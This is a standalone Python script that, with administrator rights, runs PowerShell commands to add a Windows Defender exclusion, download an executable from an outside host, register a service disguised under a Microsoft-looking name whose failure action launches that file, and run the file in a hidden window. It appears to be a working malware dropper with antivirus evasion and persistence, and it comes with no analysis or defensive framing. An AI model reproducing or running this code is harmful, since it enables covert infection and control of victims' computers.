import subprocess
import ctypes
import threading
import sys

# Start of desired section
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_powershell_script_elevated():
    if is_admin():
        powershell = [
    "$directoryPath = Join-Path $HOME 'lol'",
    "Add-MpPreference -ExclusionPath $directoryPath",
    "$url = 'https://top-secret.onrender.com/lol'",
    "$targetDirectory = Join-Path $HOME 'lol'",
    "if (-not (Test-Path -Path $targetDirectory)) {New-Item -Path $targetDirectory -ItemType Directory -Force}",
    "$outputFile = Join-Path $targetDirectory 'hhh.exe'",
    "sc.exe create Microsoft-EOS binPath= 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.23080.2006-0\\MsMpEng.exe' start= auto",
    "$serviceName = 'Microsoft-EOS'",
    "$failureCommand = $outputFile",
    "$actions = @{'1' = $failureCommand}",
    "foreach ($actionNumber in $actions.Keys) {",
    "    sc.exe failure $serviceName reset= 86400 actions= 'run/$actionNumber/$failureCommand'",
    "    sc.exe failureflag $serviceName $actionNumber $actionType",
    "}",
    "sc.exe failure $serviceName  command= $failureCommand",
    "Invoke-WebRequest -Uri $url -OutFile $outputFile",
    "$installerPath = $outputFile",
    "Start-Process -FilePath $installerPath -Wait -WindowStyle Hidden"
]

# Combine the PowerShell lines into a single string
        powershell_com = " ; ".join(powershell)

# Run the PowerShell script using subprocess
        subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", powershell_com], shell=True)






    else:
        ctypes.windll.kernel32.SetConsoleTitleW("Python Script")
        print("Please run the script as administrator to execute PowerShell commands with elevated privileges.")
        sys.exit(1)

def run_powershell_thread():
    run_powershell_script_elevated()

if __name__ == "__main__":
    # Create a thread for running the PowerShell script
    powershell_thread = threading.Thread(target=run_powershell_thread)

    # Start the thread
    powershell_thread.start()
# End of desired section